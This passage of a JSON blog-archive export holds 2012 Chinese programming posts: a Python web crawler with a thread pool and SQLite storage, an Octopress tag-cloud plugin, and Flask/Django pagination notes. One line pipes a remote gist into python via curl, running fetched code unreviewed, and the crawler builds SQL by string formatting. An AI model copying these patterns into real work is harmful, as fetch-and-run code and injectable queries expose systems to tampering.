\"前台(tornado),为其它部门提供发送邮件的web端, \\\n并作为数据收集服务端,前后台独立完成\"},\n            {\n                \"Project\" : \"windows个人安全终端系统\",\n\"Description\" : \"前后台和接收数据的socket服务器独立完成，\\\n客户端图形编程使用qt\"},\n            {\n                \"Project\" : \"地推(一个分布在全国的各个办事处的称呼:地面推广) \\\nIDC质量测试系统\",\n                \"Description\": \"还在代码实现中,前台flask, \\\n数据接收服务准备使用twisted,客户端为windows进程\"}])\n \n    @property\n    @colorprint(\"@Where\",False)\n    def findme(self):\n        return enumerate([\n            {\n                \"Link\" : \"http://www.dongwm.com\",\n\"Description\" : \"个人技术博客\"},\n            {\n                \"Link\" : \"http://www.zhihu.com/people/dongweiming\",\n\"Description\" : \"知乎\"},\n            {\n                \"Link\" : \"http://www.quora.com/Weiming-Dong\",\n\"Description\" : \"Quora\"},\n            {\n                \"Link\" : r\"https://twitter.com/#!/dongweiming\",\n\"Description\" : \"Twitter\"},\n            {\n                \"Link\" : \"http://www.ailll.com\",\n\"Description\" : \"音乐分享网站\"},\n            {\n                \"Link\" : \"http://dongwm.blog.51cto.com\",\n\"Description\" : \"51cto的推荐博客\"},\n            {\n                \"Link\" : \"http://youhouer.appspot.com\",\n\"Description\" : \"基于Google App Engine的前端网站\"}])\n                \n    def show(self):\n        prolist = [i for i in dir(self) if not i.startswith(\"_\") \\\n            and not i.startswith(\"personal\")]\n        self.personal_information\n        for pro in prolist:\n            getattr(self, pro)\n\nif __name__ == \"__main__\":\n    dongweiming = ForJob()\n    print dongweiming\n    dongweiming.show()\n</pre></figure></notextile></div>\n\n#####效果:\n1. 直接保存文件,linux下终端执行,但是windows执行会有乱码\n2. 直接linux下终端执行:curl https://raw.github.com/gist/3496061/b63efdf0c1c8d0e12df4f5b905903128c951b282/My_Resume.py |python",
    "date": {
      "year": "2012",
      "month": "October",
      "day": "21"
    }
  },
  {
    "id": 252,
    "title": "爬虫练习",
    "category": "python",
    "tags": [
      "Crawler",
      "ThreadPool",
      "doctest"
    ],
    "url": "/archives/pa-chong-lian-xi/",
    "content": "####*前言*\r\n\r\n20号参加pycon,发现有个招聘公司[知道创宇](http://blog.knownsec.com/2012/02/knownsec-recruitment/), 正好换工作,就去公司网站转了下,发现挺有意思:投简历需要一个网站爬虫程序,基本要求如下(可以直接点开上面网页去看):\r\n\r\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\r\n使用python编写一个网站爬虫程序，支持参数如下：\r\n\r\nspider.py -u url -d deep -f logfile -l loglevel(1-5)  --testself -thread number --dbfile  filepath  --key=”HTML5”\r\n\r\n\r\n参数说明：\r\n\r\n-u 指定爬虫开始地址\r\n\r\n-d 指定爬虫深度\r\n\r\n--thread 指定线程池大小，多线程爬取页面，可选参数，默认10\r\n\r\n--dbfile 存放结果数据到指定的数据库（sqlite）文件中\r\n\r\n--key 页面内的关键词，获取满足该关键词的网页，可选参数，默认为所有页面\r\n\r\n-l 日志记录文件记录详细程度，数字越大记录越详细，可选参数，默认spider.log\r\n\r\n--testself 程序自测，可选参数\r\n \r\n功能描述：\r\n\r\n1、指定网站爬取指定深度的页面，将包含指定关键词的页面内容存放到sqlite3数据库文件中\r\n\r\n2、程序每隔10秒在屏幕上打印进度信息\r\n\r\n3、支持线程池机制，并发爬取网页\r\n\r\n4、代码需要详尽的注释，自己需要深刻理解该程序所涉及到的各类知识点\r\n\r\n5、需要自己实现线程池\r\n</pre></figure></notextile></div>\r\n\r\n\r\n搞了2天,根据研究,弄了一个版本(友情提示,仅供学习参考,要是面试这个职位,建议大家用其它方法实现,因为我投递过了,不要拿来主义额^.^)\r\n#####代码如下(隐藏了个人信息用'XXX'代替)\r\n\r\n\r\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\r\n#!/usr/bin/env python\r\n#coding=utf-8\r\n\r\nimport urllib2 \r\nimport Queue\r\nimport sys\r\nimport traceback\r\nimport threading\r\nimport re\r\nimport datetime\r\nimport lxml\r\nimport chardet\r\nimport logging\r\nimport logging.handlers\r\nfrom time import sleep\r\nfrom urlparse import urlparse\r\nfrom lxml import etree\r\nfrom optparse import OptionParser\r\n\r\ntry:\r\n    from sqlite3 import dbapi2 as sqlite\r\nexcept:\r\n    from pysqlite2 import dbapi2 as sqlite \r\n\r\n#__doc__注释  执行脚本 -h 或者 --help  打印输出的内容\r\n'''\r\nThis script is used to crawl analyzing web!\r\n\r\nThe Feature: \r\n1 可以指定抓取的深度\r\n2 将抓取到的关键字数据存放在sqlite\r\n3 使用logging记录日志\r\n4 并发线程池\r\n\r\nRequired dependencies: \r\n1 chardet #分析抓取页面的字符集 \r\nsudo easy_install chardet\r\n\r\nUsage: \r\nspider.py -u url -d deep -f logfile -l loglevel(1-5)  --testself -thread number --dbfile  filepath  --key=”HTML5”\r\n\r\nWriter: Dongweiming\r\nDate: 2012.10.22\r\n'''\r\n\r\n\r\nlock = threading.Lock() #设置线程锁\r\nLOGGER = logging.getLogger('Crawler') #设置logging模块的前缀\r\nLEVELS={   #日志级别\r\n        1:'CRITICAL',\r\n        2:'ERROR',\r\n        3:'WARNING',\r\n        4:'INFO',\r\n        5:'DEBUG',#数字越大记录越详细\r\n        }\r\nformatter = logging.Formatter('%(name)s %(asctime)s %(levelname)s %(message)s') #自定义日志格式\r\n\r\nclass mySqlite(object):\r\n    \r\n    def __init__(self, path, logger, level):\r\n        '''初始化数据库连接.\r\n \r\n           >>> from sqlite3 import dbapi2 as sqlite\r\n           >>> conn = sqlite.connect('testdb')\r\n        '''\r\n        try:\r\n            self.conn = sqlite.connect(path) #连接sqlite\r\n            self.cur = self.conn.cursor()  #cursor是一个记录游标，用于一行一行迭代的访问查询返回的结果\r\n        except Exception, e:\r\n            myLogger(logger, self.loglevel, e, True)\r\n            return -1\r\n        \r\n        self.logger = logger\r\n        self.loglevel = level\r\n\r\n    def create(self, table): \r\n        '''创建table，我这里创建包含2个段 ID（数字型，自增长），Data（char 128字符）'''\r\n        try:\r\n            self.cur.execute(\"CREATE TABLE IF NOT EXISTS %s(Id INTEGER PRIMARY KEY AUTOINCREMENT, Data VARCHAR(40))\"% table)\r\n            self.done()\r\n        except sqlite.Error ,e: #异常记录日志并且做事务回滚,以下相同\r\n            myLogger(self.logger, self.loglevel, e, True) \r\n            self.conn.rollback()\r\n        if self.loglevel >3: #设置在日志级别较高才记录,这样级别高的详细\r\n                myLogger(self.logger, self.loglevel, '创建表%s' % table)\r\n\r\n    def insert(self, table, data):\r\n        '''插入数据，指定表名，设置data的数据'''\r\n        try:\r\n            self.cur.execute(\"INSERT INTO %s(Data) VALUES('%s')\" % (table,data))\r\n            self.done()\r\n        except sqlite.Error ,e:\r\n            myLogger(self.logger, self.loglevel, e, True)\r\n            self.conn.rollback()\r\n        else:\r\n            if self.loglevel >4:\r\n                myLogger(self.logger, self.loglevel, '插入数据成功')\r\n\r\n    def done(self):\r\n        '''事务提交'''\r\n        self.conn.commit()\r\n\r\n    def close(self):\r\n        '''关闭连接'''\r\n        self.cur.close()\r\n        self.conn.close()\r\n        if self.loglevel >3:\r\n            myLogger(self.logger, self.loglevel, '关闭sqlite操作')\r\n\r\n\r\nclass Crawler(object):\r\n\r\n    def __init__(self, args, app, table, logger):\r\n        self.deep = args.depth  #指定网页的抓取深度        \r\n        self.url = args.urlpth #指定网站地址\r\n        self.key = args.key #要搜索的关键字\r\n        self.logfile = args.logfile #日志文件路径和名字\r\n        self.loglevel = args.loglevel #日志级别\r\n        self.dbpth = args.dbpth #指定sqlite数据文件路径和名字\r\n        self.tp = app #连接池回调实例\r\n        self.table = table #每次请求的table不同 \r\n        self.logger = logger #logging模块实例\r\n        self.visitedUrl = [] #抓取的网页放入列表,防止重复抓取\r\n\r\n    def _hasCrawler(self, url): \r\n        '''判断是否已经抓取过这个页面'''\r\n        return (True if url in self.visitedUrl else False)\r\n     \r\n    def getPageSource(self, url, key, deep): \r\n        ''' 抓取页面,分析,入库.\r\n        '''\r\n        headers = {  #设计一个用户代理,更好防止被认为是爬虫\r\n            'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; \\\r\n            rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6' }\r\n        #if  urlparse(url).scheme == 'https':\r\n           #pass\r\n        if self._hasCrawler(url): #发现重复直接return\r\n            return\r\n        else:\r\n            self.visitedUrl.append(url) #发现新地址假如到这个列表\r\n        try:\r\n            request = urllib2.Request(url = url, headers = headers) #创建一个访问请求,指定url,并且把访问请求保存在request \r\n            result = urllib2.urlopen(request).read() #打开这个请求,并保存读取数据\r\n        except urllib2.HTTPError, e:  #触发http异常记录日志并返回\r\n            myLogger(self.logger, self.loglevel, e, True)\r\n            return -1\r\n        try:\r\n            encoding = chardet.detect(result)['encoding'] #判断页面的编码\r\n            if encoding.lower() == 'gb2312':\r\n                encoding = 'gbk'  #今天我抓取新浪是gb2312,但是其中有个'蔡旻佑'不能被识别,所以用gbk去解码gb2312的页面\r\n            if encoding.lower() != 'utf-8': #发现不是默认编码就用应该的类型解码\r\n                result = result.decode(encoding)\r\n        except Exception, e:\r\n            myLogger(self.logger, self.loglevel, e, True)\r\n            return -1\r\n        else:\r\n            if self.loglevel >3:\r\n                myLogger(self.logger, self.loglevel, '抓取网页 %s 成功' % url)\r\n        try:\r\n            self._xpath(url, result, ['a'], unicode(key, 'utf8'), deep) #分析页面中<a>的连接地址,以及它的内容\r\n            self._xpath(url, result, ['title', 'p', 'li', 'div'], unicode(key, \"utf8\"), deep) #分析这几个标签的内容\r\n        except TypeError: #对编码类型异常处理,有些深度页面和主页的编码不同\r\n            self._xpath(url, result, ['a'], key, deep)\r\n            self._xpath(url, result, ['title', 'p', 'li', 'div'], key, deep)\r\n        except Exception, e:\r\n            myLogger(self.logger, self.loglevel, e, True)\r\n            return -1\r\n        else:\r\n            if self.loglevel >3:\r\n                myLogger(self.logger, self.loglevel, '分析网页 %s 成功' % url)\r\n        return True\r\n\r\n    def _xpath(self, weburl, data, xpath, key, deep):\r\n\r\n        sq = mySqlite(self.dbpth, self.logger, self.loglevel)\r\n        page = etree.HTML(data)\r\n        for i in xpath:\r\n            hrefs = page.xpath(u\"//%s\" % i) #根据xpath标签\r\n            if deep >1:\r\n                for href in hrefs:\r\n                    url = href.attrib.get('href','')\r\n                    if not url.startswith('java') and not  \\\r\n                        url.startswith('mailto'):  #过滤javascript和发送邮件的链接\r\n                            self.tp.add_job(self.getPageSource,url, key, deep-1) #递归调用,直到符合的深度\r\n            for href in hrefs:\r\n                value = href.text  #抓取相应标签的内容\r\n                if value:\r\n                    m = re.compile(r'.*%s.*' % key).match(value) #根据key匹配相应内容\r\n                    if m:\r\n                        sq.insert(self.table, m.group().strip()) #将匹配的数据插入到sqlite\r\n        sq.close()\r\n\r\n    def work(self):\r\n        '''主方法调用.\r\n        \r\n        >>> import datetime\r\n        >>> logger = configLogger('test.log')\r\n        >>> time = datetime.datetime.now().strftime(\"%m%d%H%M%S\")\r\n        >>> sq = mySqlite('test.db', logger, 1)\r\n        >>> table = 'd' + str(time)\r\n        >>> sq.create(table)\r\n        >>> tp = ThreadPool(5)\r\n        >>> def t():pass\r\n        >>> t.depth=1\r\n        >>> t.urlpth='http://www.baidu.com'\r\n        >>> t.logfile = 'test.log'\r\n        >>> t.loglevel = 1\r\n        >>> t.dbpth = 'test.db'\r\n        >>> t.key = 'test'\r\n        >>> d = Crawler(t, tp, table, logger)\r\n        >>> d.getPageSource(t.urlpth, t.key, t.depth)\r\n        True\r\n        '''\r\n        if not self.url.startswith('http://'): #支持用户直接写域名,当然也支持带前缀\r\n            self.url = 'http://' + self.url\r\n        self.tp.add_job(self.getPageSource, self.url, self.key, self.deep)\r\n        self.tp.wait_for_complete() #等待线程池完成\r\n\r\n\r\nclass MyThread(threading.Thread):\r\n\r\n    def __init__(self, workQueue, timeout=30, **kwargs):\r\n        threading.Thread.__init__(self, kwargs=kwargs)\r\n        self.timeout = timeout #线程在结束前等待任务队列多长时间\r\n        self.setDaemon(True)  #设置deamon,表示主线程死掉,子线程不跟随死掉\r\n        self.workQueue = workQueue\r\n        self.start() #初始化直接启动线程\r\n \r\n    def run(self):\r\n        '''重载run方法'''\r\n        while True:\r\n            try:\r\n                lock.acquire()   #线程安全上锁\r\n                callable, args = self.workQueue.get(timeout=self.timeout) #从工作队列中获取一个任务\r\n                res = callable(*args)  #执行的任务\r\n                lock.release()  #执行完,释放锁\r\n            except Queue.Empty: #任务队列空的时候结束此线程\r\n                break\r\n            except Exception, e:\r\n                myLogger(self.logger, self.loglevel, e, True)\r\n                return -1\r\n\r\n\r\nclass ThreadPool(object):\r\n\r\n    def __init__(self, num_of_threads):\r\n         self.workQueue = Queue.Queue()\r\n         self.threads = []\r\n         self.__createThreadPool(num_of_threads)\r\n \r\n    def __createThreadPool(self, num_of_threads):\r\n         for i in range(num_of_threads):\r\n             thread = MyThread(self.workQueue)\r\n             self.threads.append(thread)\r\n \r\n    def wait_for_complete(self):\r\n         '''等待所有线程完成'''\r\n         while len(self.threads):\r\n             thread = self.threads.pop()\r\n         if thread.isAlive():  #判断线程是否还存活来决定是否调用join\r\n             thread.join()\r\n     \r\n    def add_job( self, callable, *args):\r\n        '''增加任务,放到队列里面'''\r\n        self.workQueue.put((callable, args))\r\n   \r\n\r\ndef configLogger(logfile):\r\n    '''配置日志文件和记录等级'''\r\n    try:\r\n        handler = logging.handlers.RotatingFileHandler(logfile, \r\n                                                       maxBytes=10240000, #文件最大字节数\r\n                                                       backupCount=5, #会轮转5个文件，共6个\r\n                                                        )\r\n    except IOError, e:\r\n        print e\r\n        return -1\r\n    else:\r\n        handler.setFormatter(formatter)  #设置日志格式\r\n        LOGGER.addHandler(handler) #增加处理器\r\n        logging.basicConfig(level=logging.NOTSET) #设置,不打印小于4级别的日志\r\n    return LOGGER #返回logging实例\r\n\r\ndef myLogger(logger, lv, mes, err=False):\r\n    '''记录日志函数'''\r\n    getattr(logger, LEVELS.get(lv, 'WARNING').lower())(mes)\r\n    if err: #当发现是错误日志,还会记录错误的堆栈信息\r\n        getattr(logger, LEVELS.get(lv, 'WARNING').lower())(traceback.format_exc())\r\n\r\ndef parse():\r\n    parser = OptionParser(\r\n                  description=\"This script is used to crawl analyzing web!\")\r\n    parser.add_option(\"-u\", \"--url\", dest=\"urlpth\", action=\"store\",\r\n                  help=\"Path you want to fetch\", metavar=\"www.sina.com.cn\")\r\n    parser.add_option(\"-d\", \"--deep\", dest=\"depth\", action=\"store\",type=\"int\",\r\n                  help=\"Url path's deep, default 1\", default=1)\r\n    parser.add_option(\"-k\", \"--key\", dest=\"key\", action=\"store\",\r\n                  help=\"You want to query keywords, For example 'test'\")\r\n    parser.add_option(\"-f\", \"--file\", dest=\"logfile\", action=\"store\",\r\n                  help=\"Record log file path and name, default spider.log\", \r\n                  default='spider.log')\r\n    parser.add_option(\"-l\", \"--level\", dest=\"loglevel\", action = \"store\",\r\n                  type=\"int\",help=\"Log file level, default 1(CRITICAL)\", \r\n                  default=1)\r\n    parser.add_option(\"-t\", \"--thread\", dest=\"thread\", action=\"store\",\r\n                  type=\"int\",help=\"Specify the thread pool, default 10\", \r\n                  default=10)\r\n    parser.add_option(\"-q\", \"--dbfile\", dest=\"dbpth\", action=\"store\",\r\n                  help=\"Specify the the sqlite file directory and name, \\\r\n                  default  test.db\", metavar='test.db')\r\n    parser.add_option(\"-s\", \"--testself\", dest=\"testself\", action=\"store_true\",\r\n                  help=\"Test myself\", default=False)\r\n    (options, args) = parser.parse_args()  \r\n    return options\r\n\r\ndef main():\r\n    '''主函数'''\r\n        \r\n    options = parse()\r\n    if options.testself: #如果testself,执行doctest\r\n        import doctest\r\n        print doctest.testmod()\r\n        return\r\n    if not options.urlpth or not options.key or not options.dbpth: #判断必选项是否存在\r\n        print 'Need to specify the parameters option \"-u \" or \"-k\" or \"-q\"!'\r\n        return\r\n    if '-h' in sys.argv  or '--help' in sys.argv:  #选择帮助信息,打印__doc__\r\n        print __doc__\r\n\r\n    logger = configLogger(options.logfile) #实例化日志调用\r\n    time = datetime.datetime.now().strftime(\"%m%d%H%M%S\") #每次请求都会根据时间创建table\r\n    tp = ThreadPool(options.thread) \r\n    sq = mySqlite(options.dbpth, logger, options.loglevel)\r\n    table = 'd' + str(time)\r\n    sq.create(table) #创建table\r\n    sq.close()\r\n    crawler = Crawler(options, tp, table, logger)\r\n    crawler.work()  #主方法\r\n \r\nif __name__ == '__main__':\r\n    main()\r\n</pre></figure></notextile></div>",
    "date": {
      "year": "2012",
      "month": "October",
      "day": "23"
    }
  },
  {
    "id": 253,
    "title": "octopress的3D标签云插件",
    "category": "ruby",
    "tags": [
      "cumulus",
      "word-cumulus",
      "jsapi"
    ],
    "url": "/archives/octopress-de-3D-biao-qian-yun/",
    "content": "####*前言*\n\n最近看了《社交网站的数据挖掘与分析》，了解到关于谷歌可视化工具，正好有2次都说到了标签的3D展现，以前用wordpress的时候有个插件叫做wp-cumulus，而octopress里面有一个相应的标签插件，但是却是静态展示，一直不爽，然后就萌发了改一个3D的octoress标签云插件的想法，其中word cumulus借用了[谷歌api](https://www.google.com/jsapi)，ruby程序还是借以前的[topress-tagcloud](https://github.com/tokkonopapa/octopress-tagcloud)，思路参考了[word-cumulus-goog-vis](http://code.google.com/p/word-cumulus-goog-vis),我的设计是这样的如下：\n\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n\n1. jekyll生成静态页面的时候，根据相关插件计算标签的地址，数量和标签内容\n2. 将这些数据用json.dump的方式写入到一个json文件（因为octopress是静态页面，不能从数据库抓取数据）\n3. 新增一个javascript脚本（需要添加到source/_includes/head.html，具体看我的后面的例子程序中的注释），实现调取谷歌可视化工具的接口，把数据写到swf文件中\n4. 当打开网页的时候会调用jquery的getjson（我用的是.ajax）读取数据，将数据格式化，通过js脚本写入div（div所在的html已经放在边栏）\n\n\n</pre></figure></notextile></div>\n\n\n\n#####插件代码如下\n\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n# encoding: utf-8\n\nrequire 'json' #导入json依赖\nrequire 'pathname'\n  \n\nmodule Jekyll \n\n  class TagCloud < Liquid::Tag  #标签云的类继承至Liquid::Tag，liquid是一个ruby的模版引擎，\n\n    def initialize(tag_name, markup, tokens)\n      @opts = {}\n      if markup.strip =~ /\\s*counter:(\\w+)/i  #检查是否定义参数，没有的话不计算标签数量\n        @opts['counter'] = ($1 == 'true') #哈希项的结果就是这个参数是否为true的布尔值\n        markup = markup.strip.sub(/counter:\\w+/i,'')\n      end\n      super\n    end\n\n    def render(context)\n      lists = {}\n      max, min = 1, 1\n      config = context.registers[:site].config #内置检查站点配置\n      category_dir = config['root'] + config['category_dir'] + '/' #标签基目录\n      categories = context.registers[:site].categories\n      categories.keys.sort_by{ |str| str.downcase }.each do |category| #标签根据小写字符串排序 挨个计算其存在数量\n        count = categories[category].count\n        lists[category] = count\n        max = count if count > max\n      end\n\n      li = []\n      lists.each do | category, counter |\n        nli = []\n        url = category_dir + category.gsub(/_|\\P{Word}/, '-').gsub(/-{2,}/, '-').downcase\n        nli[0] = category + '[' + categories[category].count.to_s + ']' #第一个参数是标签和数量的字符串\n        nli[1] = url #第二个标签是标签集合的地址\n        if @config['category_counter']\n          nli[2] = categories[category].count\n        else nli[2] = 8\n        end\n        li.push(nli)\n      end\n      f = File.open('%s/../source/javascripts/tag.json' % \\\n          Pathname.new(File.dirname(__FILE__)).realpath,'w') #操作文件\n      f.puts(JSON.dump(li)) #写入数据\n      f.close()\n    end\n  end\n\nend\n\nLiquid::Template.register_tag('tag_cloud', Jekyll::TagCloud)  #让标签生效\n\n\n</pre></figure></notextile></div>\n\n\n\n#####javascript代码如下\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n\nvar json_data = (function () {\n    var json = null;\n    $.ajax({   //通过jquery方法获取json文件的数据\n        'async': false,\n        'global': false,\n        'url': '/javascript/tag.json',  //这里地址是错误的，因为静态页面会把握的标签当成真实环境，其实是javascripts，具体代码请看github项目\n        'dataType': \"json\",\n        'success': function (data) {\n            json = data;\n        }\n    });\n    return json;\n})(); \n      google.setOnLoadCallback(drawVisualization);  //设定可视化load后调用函数\n\n    function drawVisualization() {\n\n        var data = new google.visualization.DataTable(); //创建数据表\n        data.addColumn('string', 'Tag'); //加三个字段\n        data.addColumn('string', 'URL'); \n        data.addColumn('number', 'Font size');\n\n        data.addRows(json_data.length);  //确定标签的数量\n        for (var i = 0; i < json_data.length; i++) {\n            var url = window.location.href + json_data[i][1];\n            data.setCell(i, 0, json_data[i][0]); // 标签\n            data.setCell(i, 1, url); // 标签的真实集合url\n            data.setCell(i, 2, 2+1.5*json_data[i][2]); // 标签字体大小\n        }\n\n        var vis = new gviz_word_cumulus.WordCumulus(document.getElementById('tag-clouds'));  //找到id为‘tag-clou’的div，这里数据也有问题，原因如上\n\n        vis.draw(data, {text_color: '#00ff00', speed: 50, width:220, height:220});  //画图  注意，修改效果云的大小在这里制定 我这里宽高都是220px\n       }\n\n</pre></figure></notextile></div>\n\n\n#####被包含的html代码如下(我放在了source/_includes/custom/asides/category_cloud.html)\n\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n<xmp>\n<section class=\"well\">  //这个主要根据你的主题而定吧，我的主题右边栏的风格都是这样\n   <ul id=\"gh_repos\" class=\"nav\">\n    <li class=\"nav-header\">标签Cloud</li>\n  </ul>\n  <div id=\"tag-clou\">{% tag_cloud counter:true %}</div>   //{% tag_cloud [counter:true] %} 制定counter为true就会根据你的标签符合的文章数对画图效果显示的该标签字体大小比例而定，不指定或者制定其他值都按照一个字体大小显示所有标签\n</section>\n</xmp>        \n        \n并且将这个html放在默认的右边栏的配置中，修改_config.yaml，其中：\n\ndefault_asides: [asides/recent_posts.html, custom/asides/links.html, asides/github.html, asides/delicious.html, asides/pinboard.html, asides/googleplus.html,custom/asides/category_cloud.html, custom/asides/douban.html, asides/article_total_sidebar.html]            \n\n\n</pre></figure></notextile></div>\n\n\n#####剩下就是修改你的主页的html（我直接修改了head.html[source/_includes/head.html],愿意的话你可以修改源码的foot.html甚至其它，只要保证它在jquery加载之后加载就好，我只粘贴新增的一部分和它附近的内容）\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n\n<xmp>\n  <script src=\"{{ root_url }}/javascripts/libs/bootstrap.js\"></script>\n  <script src=\"{{ root_url }}/javascripts/octopress.js\" type=\"text/javascript\"></script>  //原来就有\n  <script type=\"text/javascript\" src=\"/javascripts/api.js\"></script>  //这里是谷歌的jsapi，我直接保存在我脚本里面，因为谷歌可能访问不稳定，你懂得\n  <script type=\"text/javascript\" src=\"/javascripts/wordcumulus.js\"></script> //这是操作word-cumulus的\n  <script type=\"text/javascript\" src=\"/javascripts/swfobject.js\"></script> //这里是操作wp-cumulus的flash文件的\n  <script type=\"text/javascript\" src=\"/javascripts/tagcumulus.js\"></script> //这是我新建的上述js脚本地址\n  <link href=\"{{ site.subscribe_rss }}\" rel=\"alternate\" title=\"{{site.title}}\" type=\"application/atom+xml\"> //原来就有\n</xmp>\n\n</pre></figure></notextile></div>\n\n\n\n打包相关文件以及详情请参看我的github项目：[octopress-wp_cumulus_for_tagcloud](https://github.com/dongweiming/octopress-wp_cumulus_for_tagcloud)\n",
    "date": {
      "year": "2012",
      "month": "November",
      "day": "17"
    }
  },
  {
    "id": 254,
    "title": "django和flask分页",
    "category": "python",
    "tags": [
      "flask",
      "django",
      "Pagination",
      "分页"
    ],
    "url": "/archives/djangohe-flaskfen-ye/",
    "content": "####*前言*\n\n最近搞了一些关于flask和django的东西，尤其是django的模板和admin功能以及这些框架使用bootstrap的东西，没时间更新博客，先说一下flask和django分页吧\n\n#####flask的bootstrap分页插件[flask-paginate](http://packages.python.org/Flask-paginate)\n\n其实安装很常规，他的思路就是根据你的数据量给每个页面加一个li前缀到最后返回的div里面。因为官网提供的说明很简单，我在这里仔细说说：\n\n\n1. 官网说给你的网站页面添加css：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n.pagination-page-info {\n    padding: .6em;\n    padding-left: 0;\n    width: 40em;\n    margin: .5em;\n    margin-left: 0;\n    font-size: 12px;\n}\n.pagination-page-info b {\n    color: black;\n    background: #6aa6ed;\n    padding-left: 2px;\n    padding: .1em .25em;\n    font-size: 150%;\n}\n</pre></figure></notextile></div>\n其实这个是给你页面显示统计数据的方法pagination.info提供的样式，默认的class='pagination'是bootstrap自带的，不需要你添加\n\n\n2. 官网的例子使用的是：Blueprint：\n\n我们一般都是： ‘from flask import Flask’，其实Blueprint就是一个可定制的容器，一个应用可以有多个容器，他们都继承于flask.helpers._PackageBoundObject\n可以看我的一个例子：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n@app.route('/')\ndef index():\n\n\tpagesize = 100 #设定每页显示条目数\n\tpage = int(request.args.get('page',0)) #获取当前页面页数\n\tdata = get_MongoData(page, pagesize) #get_MongoData是我自己的函数，根据页数过滤要显示的数据（因为实在太大了）\n\tpagination = Pagination(total=data[1], per_page=pagesize, page=page) #total的值是总数据条目，per_page表示每页显示数目，page就是当前页数。还可以设置向前/后页面标签（默认是<</>>）等\n\treturn render_template(\"index.html\", pagination=pagination)\n</pre></figure></notextile></div>\n\n3. 我对他的一点修改：\n\t1. 我发现在我的程序里面，这个分页栏在后部会放不下而换行显示，我就直接把link_css制定的div改成了行内元素span\n\t2. 当我默认使用link_size,代码是这样：\n\t<xmp>\n\t\tlink_css = '<span class=\"pagination{0} green\"><ul>'\n\t\t其实最后页面出来的效果是'<span class=\"paginationNone green\"><ul>' \n\t</xmp>\n\t\t\n\t\t这样就没有符合的bootstrap类，所以我修改了links方法:\n\n\t\t<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n\t\t@property\n\t    def links(self):\n\t        '''get all the pagination links'''\n\t        if self.total_pages <= 1:\n\t            return ''\n\t        if not self.link_size:\n\t            self.link_size = ''\n\t        s = [link_css.format(self.link_size)]\n\t        s.append(self.prev_page)\n\t        for page in self.pages:\n\t            s.append(self.single_page(page) if page else gap_marker)\n\n\t        s.append(self.next_page)\n\t        s.append('</ul></span>')\n\t        return ''.join(s)\n        </pre></figure></notextile></div>\n\n#####flask的bootstrap分页插件[django-bootstrap-pagination](http://tgdn.github.com/django-bootstrap-pagination/)\n\ndjango的插件比较复杂，它自己定义了中间件和标签，这样你需要在模板中load它提供的函数，并且很nb的使用了RequestContext去处理变量,可以看张沈鹏以前写的一个小文章：[django 简化 view 函数的编写](http://zsp.iteye.com/blog/115254)\n\n1. 先看我的后台方法：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n\ndef showlist(req):\n\n\tt = req.GET.get('type', None)\n\tl = req.GET.get('app', None)\n\tif t and l:\n\t\tdb = getMongo('XXX.XXX.XXX.XXX:XX', 'dc2')\n\t\tif t == 'v':\n\t\t\tq = re.compile(r'.*%s$' % l)\n\t\t\tdata = db.site.find({'modules.site.level':'v4', 'site':{ '$regex' : q }}, \n\t\t\t\t{'site':1, '_id':0, 'modules.site.links':1, 'modules.site.keywords':1}).sort(\n\t\t\t\t'modules.site.site.check_time')\n\n\treturn render_to_response(\"list.html\", {'data':data}, context_instance=RequestContext(req))\n</pre></figure></notextile></div>\n\n但是运行时候会报错：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nTraceback:\nFile \"/usr/local/lib/python2.6/dist-packages/django/core/handlers/base.py\" in get_response\n  111.                         response = callback(request, *callback_args, **callback_kwargs)\nFile \"/home/dongwm/centerCon/views.py\" in showlist\n  68. \treturn render_to_response(\"list.html\", {'data':data}, context_instance=RequestContext(req))\nFile \"/usr/local/lib/python2.6/dist-packages/django/shortcuts/__init__.py\" in render_to_response\n  20.     return HttpResponse(loader.render_to_string(*args, **kwargs), **httpresponse_kwargs)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/loader.py\" in render_to_string\n  176.         return t.render(context_instance)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/base.py\" in render\n  140.             return self._render(context)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/base.py\" in _render\n  134.         return self.nodelist.render(context)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/base.py\" in render\n  823.                 bit = self.render_node(node, context)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/debug.py\" in render_node\n  74.             return node.render(context)\nFile \"/home/dongwm/centerCon/templatetags/pagination_tags.py\" in render \n  91.             page_obj = paginator.page(context['request'].page)\nFile \"/usr/local/lib/python2.6/dist-packages/django/template/context.py\" in __getitem__\n  54.         raise KeyError(key)\n\nException Type: KeyError at /showlist/\nException Value: 'request'\n</pre></figure></notextile></div>\n\n不管你用那个插件都会有这个报错。。。\n\n*后来发现原因是：*\n\n*settings文件没有设置TEMPLATE_CONTEXT_PROCESSORS*\n理由：模板上下文处理器会指定了哪些contextprocessors总是默认被使用。这样就省去了每次使用RequestContext都指定processors的麻烦\n在settings加入：\nTEMPLATE_CONTEXT_PROCESSORS = (\n    \"django.core.context_processors.media\",\n    \"django.core.context_processors.request\"\n    )\n",
    "date": {
      "year": "2012",
      "month": "December",
      "day": "29"
    }
  },
  {
    "id": 255,
    "title": "gevent-twisted-多线程谁更快?",
    "category": "python",
    "tags": [
      "twisted",
      "gevent",
      "多线程",
      "爬虫",
      "crawler"
    ],
